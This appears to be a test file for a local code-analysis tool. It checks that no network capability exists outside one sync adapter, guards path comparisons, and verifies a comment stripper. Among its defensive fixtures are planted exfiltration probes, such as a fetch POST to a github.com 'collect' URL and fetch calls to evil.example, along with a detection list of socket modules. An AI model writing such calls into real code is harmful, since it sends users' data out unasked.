// SPDX-License-Identifier: FSL-1.1-MIT
/**
 * holt — the analysis engine makes no network calls, proven by capability rather than by text.
 *
 * THE PROMISE THIS DEFENDS. holt claims your code never leaves your machine: no telemetry, no
 * phone-home, on any tier. That claim is worth something precisely because anyone can verify it in
 * one command without trusting our judgement about which calls are benign — so the check has to be
 * absolute, and it has to be checkable by the customer, not just by us.
 *
 * WHY THIS REPLACED A grep FOR URLs. The CI guard matched any `https?://` in src/, with an
 * allowlist of domains considered harmless. Two things were wrong with it, and the second is the
 * one that matters:
 *
 *   1. IT FIRED ON THE WRONG THING. The moment the product's own pricing URL moved from holt.dev
 *      to github.io, two help-text strings — `Get one at <url>` — failed the build. A URL inside a
 *      string is not a network call, and no amount of allowlist maintenance makes a text search
 *      understand that difference. The allowlist had already been extended once; extending it
 *      again is the band-aid that fails a third time.
 *
 *   2. AN ALLOWLIST OF DOMAINS IS THE WRONG GUARANTEE ANYWAY. It says "we only talk to approved
 *      hosts", when the promise is "we do not talk". A grep that permits `github.com` would have
 *      waved through a genuine exfiltration to a github.com URL.
 *
 * So this asserts the CAPABILITY is absent from analysis, hooks, MCP and CI authority resolution.
 * The only src/ exception is the separately imported Enterprise TUF adapter, reached solely by an
 * explicit `holt managed-policy sync`; its exact destination and request shape live in the audited
 * capability ledger. A module that cannot open a socket cannot phone home, whatever strings it
 * carries. That is a stronger property than the grep it replaces, and it is not fooled by text.
 *
 * The other explicit download — portable ctags setup — lives in bin/install-ctags.mjs. Neither
 * network module is imported by ordinary analysis. See src/supply-chain.mjs.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const SRC = path.join(ROOT, 'src');

/** Modules that can open a socket. Importing one is the capability; using it is the act. */
const NETWORK_MODULES = [
  'node:http', 'node:https', 'node:net', 'node:dgram', 'node:tls', 'node:http2',
  'http', 'https', 'net', 'dgram', 'tls', 'http2',
  'undici', 'axios', 'node-fetch', 'got', 'superagent', 'request', 'ws', 'socket.io-client',
];

/** Call sites that reach the network without importing anything. */
const NETWORK_CALLS = [
  { re: /(?<![\w.])fetch\s*\(/, what: 'fetch()' },
  { re: /\bglobalThis\s*(?:\.\s*|\?\.\s*)fetch\b/, what: 'globalThis.fetch' },
  { re: /\bnew\s+WebSocket\s*\(/, what: 'new WebSocket()' },
  { re: /\bnavigator\s*\.\s*sendBeacon\s*\(/, what: 'navigator.sendBeacon()' },
  { re: /\bXMLHttpRequest\b/, what: 'XMLHttpRequest' },
  { re: /\bnew\s+EventSource\s*\(/, what: 'new EventSource()' },
];

const importedModules = (source) => {
  const found = new Set();
  const patterns = [
    /\bimport\s+[^'"]*?from\s*['"]([^'"]+)['"]/g,   // import x from 'm'
    /\bimport\s*\(\s*['"]([^'"]+)['"]\s*\)/g,        // await import('m')
    /\bimport\s+['"]([^'"]+)['"]/g,                  // import 'm'
    /\brequire\s*\(\s*['"]([^'"]+)['"]\s*\)/g,       // require('m')
    /\bcreateRequire\([^)]*\)\s*\(\s*['"]([^'"]+)['"]/g,
  ];
  for (const re of patterns) {
    for (const m of source.matchAll(re)) found.add(m[1]);
  }
  return found;
};

/** Strip comments and string literals, so a URL in help text is not mistaken for code. */
const codeOnly = (source) => source
  // NEWLINE-PRESERVING. Collapsing a block comment to a single space also collapses its LINES,
  // so every `${rel}:${i + 1}` this file reports after the first block comment pointed at
  // unrelated code — the raw-comparison guard below named src/agent.mjs:371, a bare `{`, for an
  // offence that lives at line 1380. A guard nobody can follow to the defect gets ignored.
  .replace(/\/\*[\s\S]*?\*\//g, (m) => m.replace(/[^\n]/g, ' '))
  .replace(/(^|[^:])\/\/[^\n]*/g, '$1 ')
  // Template literals span lines too, for the same reason: keep the newlines, drop the content.
  .replace(/`(?:\\[\s\S]|[^\\`])*`/g, (m) => '``' + m.replace(/[^\n]/g, ''))
  // A quoted string cannot contain a raw newline in JavaScript, so the character class must
  // exclude one. Without that exclusion an unpaired apostrophe — in a regex literal, in prose the
  // comment stripper had already blanked — matched forward across 381 lines of src/agent.mjs and
  // swallowed them whole, which is the other half of why this file's line numbers were fiction.
  .replace(/'(?:\\.|[^\\'\n])*'/g, "''")
  .replace(/"(?:\\.|[^\\"\n])*"/g, '""');

async function sourceFiles(dir) {
  const out = [];
  for (const e of await fs.readdir(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) out.push(...await sourceFiles(p));
    else if (/\.(mjs|js|cjs)$/.test(e.name)) out.push(p);
  }
  return out;
}

/** The whole check, factored so the same code can be pointed at a planted fixture. */
async function networkFindings(dir) {
  const findings = [];
  for (const file of await sourceFiles(dir)) {
    const raw = await fs.readFile(file, 'utf8');
    const code = codeOnly(raw);
    const rel = path.relative(ROOT, file);

    for (const mod of importedModules(raw)) {
      if (NETWORK_MODULES.includes(mod)) findings.push(`${rel}: imports ${mod}`);
    }
    for (const { re, what } of NETWORK_CALLS) {
      if (re.test(code)) findings.push(`${rel}: calls ${what}`);
    }
  }
  return findings;
}

test('NO NETWORK: analysis, hooks, MCP and CI stay offline; only explicit managed-policy sync is in src', async () => {
  const findings = await networkFindings(SRC);
  assert.deepEqual(findings, ['src/team/managed-policy-tuf.mjs: calls globalThis.fetch'],
    'network capability must stay confined to the explicitly invoked, separately imported TUF adapter:\n  '
    + findings.join('\n  '));
});

test('NO NETWORK: the check FIRES on a real network call — proven, not assumed', async (t) => {
  // A guard nobody watched fire is a guard nobody can trust. Every one of these is a way a real
  // exfiltration could be written, INCLUDING through a domain a URL allowlist would have waved
  // through — which is why capability, not text, is the property being asserted.
  const dir = await fs.mkdtemp(path.join(process.env.HOLT_TMPDIR || os.tmpdir(), 'holt-netprobe-'));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));

  const attacks = [
    ['fetch.mjs', 'export const go = () => fetch("https://github.com/collect", { method: "POST" });\n'],
    ['https.mjs', 'import https from "node:https";\nexport const go = () => https.request("x");\n'],
    ['net.mjs', 'import { connect } from "node:net";\nexport const go = () => connect(80);\n'],
    ['dgram.mjs', 'import dgram from "node:dgram";\nexport const s = dgram.createSocket("udp4");\n'],
    ['undici.mjs', 'import { request } from "undici";\nexport const go = () => request("x");\n'],
    ['dynamic.mjs', 'export const go = async () => (await import("node:http")).get("x");\n'],
    ['required.mjs', 'const http = require("node:http");\nexport const go = () => http.get("x");\n'],
  ];

  // EVERY ATTACK IS PLANTED TWICE: bare, and after a realistic PRELUDE.
  //
  // Bare one- and two-line probes are what this control used to plant, and they are the reason it
  // reported green through a stripper that was deleting 43% of the codebase before the check ever
  // read it — 7,660 of 17,651 lines of src/ and bin/, including 1,473 of bin/holt.mjs's 1,545.
  // Nothing was stripped from a two-line file, so the guard fired every time and proved only that
  // it works on inputs unlike the ones it grades. A control has to look like the thing.
  //
  // The prelude is exactly the three shapes that were swallowing lines: a JSDoc block comment, a
  // multi-line template literal, and an unpaired apostrophe in prose.
  const PRELUDE =
    '/**\n'
    + ' * A perfectly ordinary module header, several lines long, as every file in src/ has.\n'
    + ' * It mentions the tool\'s behaviour, so it carries an unpaired apostrophe.\n'
    + ' */\n'
    + 'export const BANNER = `\n'
    + '  a multi-line template literal\n'
    + '  spanning several lines\n'
    + '`;\n'
    + '// a trailing line comment\n';

  for (const [name, source] of attacks) {
    for (const [shape, text] of [['bare', source], ['after a module prelude', PRELUDE + source]]) {
      const probe = path.join(dir, 'probe');
      await fs.rm(probe, { recursive: true, force: true });
      await fs.mkdir(probe, { recursive: true });
      await fs.writeFile(path.join(probe, name), text);
      const findings = await networkFindings(probe);
      assert.ok(findings.length > 0,
        `the check did NOT fire on ${name} (${shape}) — it cannot be trusted to have found nothing in src/`);
    }
  }
});

test('NO NETWORK: a URL in help text is NOT a network call', async (t) => {
  // The false positive that broke the build and prompted this rewrite. The product's own pricing
  // URL moved from holt.dev to github.io and two help strings — `Get one at <url>` — failed CI,
  // because the old guard searched TEXT and carried a domain allowlist. Appending another domain
  // was the obvious fix and the wrong one: an allowlist says "we only talk to approved hosts",
  // when the promise is "we do not talk".
  const dir = await fs.mkdtemp(path.join(process.env.HOLT_TMPDIR || os.tmpdir(), 'holt-urltext-'));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));
  await fs.writeFile(path.join(dir, 'help.mjs'),
    'export const FIX = "Get one at https://example.invalid/pricing, then run: holt license activate";\n'
    + '// see https://example.invalid/docs for the whole story\n'
    + 'export const DOCS = `https://example.invalid/guide`;\n');

  assert.deepEqual(await networkFindings(dir), [],
    'a URL inside a string or a comment is text, not a call — flagging it makes the guard a ' +
    'maintenance burden that eventually gets weakened to shut it up');
});

test('PATHS: no source file compares paths without canonicalising them', async () => {
  // THIS DEFECT SHIPPED THREE TIMES IN ONE DAY, in three files, each invisible on Linux:
  //   `rm -rf <worktree holding the only copy of something>` was ALLOWED on macOS and Windows;
  //   a workstream lookup matched NOTHING so four tests asserted nothing while reporting green;
  //   `mv src/a.js src/b.js` — a rename inside one worktree — was DENIED.
  //
  // One cause each time: path.resolve() makes a path absolute but does not resolve symlinks and
  // does not fold case. macOS reports /private/var where the caller holds /var; Windows hands out
  // 8.3 short names and is case-insensitive. Linux is neither, which is why every instance passed
  // there and only there — and why fixing them one per CI cycle kept finding the next one.
  //
  // Fixing three instances is not fixing the class. The class closes when there is ONE way to
  // compare paths here and the codebase cannot drift back to the raw form. src/paths.mjs is that
  // way; this test is what keeps it that way.
  const roots = [path.join(ROOT, 'src'), path.join(ROOT, 'bin')];
  const RAW_COMPARISON = [
    { re: /path\.resolve\([^)]*\)\s*===/, what: 'path.resolve(...) === ...' },
    { re: /===\s*path\.resolve\(/, what: '... === path.resolve(...)' },
    { re: /\.startsWith\(\s*path\.resolve\(/, what: '.startsWith(path.resolve(...))' },
    { re: /path\.resolve\([^)]*\)\.startsWith\(/, what: 'path.resolve(...).startsWith(...)' },
    // path.relative IS THE SAME BUG WITHOUT A COMPARISON OPERATOR, which is exactly why it slipped
    // past this guard. It is arithmetic on two strings, so it is as wrong as `===` when the sides
    // came from different sources - and they routinely do: git reports a worktree at
    // /private/var/folders/... on macOS while mkdtemp handed the caller /var/folders/..., and
    // path.relative dutifully returned `../../../../../../../var/folders/...`. That string went to
    // `git add`, which indexed nothing, and `holt discard` refused every capture on macOS and
    // Windows while passing on Linux. Third instance of this class in one session.
    //
    // relativeWithinAsync() in src/paths.mjs canonicalises both sides first. A path.relative whose
    // FIRST argument is a variable is the hazardous shape (a root from one source, a target from
    // another); path.relative(ROOT, file) inside a test, where both come from the same walk, is
    // not - so the guard covers src/ and bin/, where every root arrives from git or the caller.
    { re: /path\.relative\(\s*[A-Za-z_$][\w$.]*\s*,/, what: 'path.relative(<uncanonicalised>, ...)' },
    // FOURTH INSTANCE, AND IT WALKED STRAIGHT THROUGH THE THREE PATTERNS ABOVE. The shapes above
    // all require `path.resolve(...)` to sit IMMEDIATELY beside the operator, so wrapping it in
    // anything at all hid it: `foldCase(path.resolve(w.path)) === foldCase(root)` in src/agent.mjs
    // was invisible here for the whole life of this guard, and the `?? … samePathSync(
    // path.resolve(w.path), root)` written under it as a fallback was the byte-for-byte same
    // comparison, so the lookup had no fallback at all. On macOS every deny message then reported
    // `[seen by the guard, not by the last scan]` against files the scan had seen perfectly well.
    //
    // A guard whose pattern is "the mistake, spelled exactly one way" catches the instance and not
    // the class. These two cover the wrapped forms.
    { re: /\w+\(\s*path\.resolve\([^;]*\)\s*\)\s*===/, what: '<wrapper>(path.resolve(...)) === ...' },
    // Spelled to survive an ALIAS. src/agent.mjs had `const samePath = samePathSync` and then
    // `samePath(path.resolve(w.path), root)`; a pattern naming the imported symbol exactly would
    // never have seen it. Any local renaming that still reads as a path comparison is covered.
    { re: /same[Pp]ath\w*\(\s*path\.resolve\(/, what: 'samePath*(path.resolve(...), ...)' },
  ];

  const offences = [];
  for (const root of roots) {
    for (const file of await sourceFiles(root)) {
      const rel = path.relative(ROOT, file);
      if (rel.endsWith('paths.mjs')) continue;            // the module that DEFINES the correct way
      const code = codeOnly(await fs.readFile(file, 'utf8'));
      code.split('\n').forEach((line, i) => {
        for (const { re, what } of RAW_COMPARISON) {
          if (re.test(line)) offences.push(`${rel}:${i + 1} compares paths with ${what}`);
        }
      });
    }
  }
  assert.deepEqual(offences, [],
    'use canonicalPath / samePathAsync / underOrEqualAsync / findByPath / relativeWithinAsync from ' +
    'src/paths.mjs — a raw ' +
    'path.resolve() comparison silently finds nothing on macOS and Windows:\n  ' + offences.join('\n  '));
});

test('PATHS: canonicalPath resolves a path that does not exist yet', async (t) => {
  // The specific hole that denied renames: realpath FAILS on a path that does not exist, and a
  // move destination never exists yet. Falling back to the raw string put source and destination
  // in different worktrees on macOS, so an in-place rename looked like a move out.
  const { canonicalPath } = await import('../../src/paths.mjs');
  const base = process.env.HOLT_TMPDIR || os.tmpdir();
  const real = await fs.mkdtemp(path.join(base, 'holt-canon-'));
  const link = path.join(base, `holt-canon-link-${path.basename(real)}`);
  t.after(async () => {
    await fs.rm(link, { force: true }).catch(() => {});
    await fs.rm(real, { recursive: true, force: true }).catch(() => {});
  });
  await fs.mkdir(path.join(real, 'src'), { recursive: true });
  await fs.writeFile(path.join(real, 'src', 'exists.js'), 'x\n');

  try {
    await fs.symlink(real, link, process.platform === 'win32' ? 'junction' : 'dir');
  } catch {
    return; // platform refuses symlinks
  }

  // An existing file and a not-yet-existing sibling must canonicalise into the SAME directory —
  // that equality is exactly what decides rename-vs-move-out.
  const existing = await canonicalPath(path.join(link, 'src', 'exists.js'));
  const missing = await canonicalPath(path.join(link, 'src', 'not-created-yet.js'));
  assert.equal(path.dirname(existing), path.dirname(missing),
    'a destination that does not exist yet must canonicalise into the same directory as its ' +
    `siblings, or a rename reads as a move out of the worktree — got ${existing} vs ${missing}`);
});

test('STRIPPER: comment/string removal must not delete LINES from any source file', async () => {
  // THE CONTRACT EVERY OTHER CHECK IN THIS FILE DEPENDS ON. codeOnly() blanks comments and string
  // contents so a URL in help text is not read as a network call and a path in prose is not read
  // as a comparison — but it did so by REPLACING multi-line spans with a single character. Line
  // counts collapsed, so `${rel}:${i + 1}` pointed at unrelated code, and — far worse — whole
  // regions of every file stopped being scanned at all. Measured on the tree that shipped:
  // 7,660 of 17,651 lines invisible, 95% of bin/holt.mjs among them. Both the no-telemetry
  // capability check and the raw-path-comparison guard were grading a little over half the code
  // while reporting on all of it.
  //
  // Blanking must preserve the line structure exactly. This is the single assertion that keeps it
  // true, and it is checked against the real codebase rather than a fixture, because the shapes
  // that broke it — a JSDoc header, a multi-line template, an apostrophe in prose — are what real
  // source is made of.
  const offenders = [];
  let checked = 0;
  for (const root of [SRC, path.join(ROOT, 'bin')]) {
    for (const file of await sourceFiles(root)) {
      const raw = await fs.readFile(file, 'utf8');
      const before = raw.split('\n').length;
      const after = codeOnly(raw).split('\n').length;
      checked++;
      if (before !== after) {
        offenders.push(`${path.relative(ROOT, file)}: ${before} lines in, ${after} out (${before - after} invisible)`);
      }
    }
  }
  assert.ok(checked > 20, `ANTI-VACUITY: this must have read the real source tree, only saw ${checked} files`);
  assert.deepEqual(offenders, [],
    'codeOnly() deleted lines, so every check in this file is reading a subset of the code and '
    + 'reporting line numbers that do not exist:\n  ' + offenders.join('\n  '));
});

test('STRIPPER: ANTI-VACUITY — it still blanks what it is supposed to blank', async () => {
  // The other half. A "stripper" that returned its input unchanged would pass the line-count
  // contract above perfectly, and would then let a URL in help text read as a network call and a
  // path inside a comment read as a raw comparison. Both directions are pinned.
  const src = [
    '/* a block',
    '   comment mentioning fetch("https://evil.example") */',
    'const help = "run holt at https://holt.dev";',
    "const other = 'path.resolve(a) === b';",
    'const tpl = `',
    '  fetch("https://evil.example")',
    '`;',
    'export const real = 1;',
  ].join('\n');
  const out = codeOnly(src);
  assert.equal(out.split('\n').length, src.split('\n').length, 'line count preserved');
  assert.ok(!out.includes('evil.example'), `commented and templated URLs must be blanked: ${out}`);
  assert.ok(!out.includes('holt.dev'), `string contents must be blanked: ${out}`);
  assert.ok(!out.includes('path.resolve(a) === b'), `string contents must be blanked: ${out}`);
  assert.ok(out.includes('export const real = 1;'), 'ANTI-VACUITY: real code must survive');
});
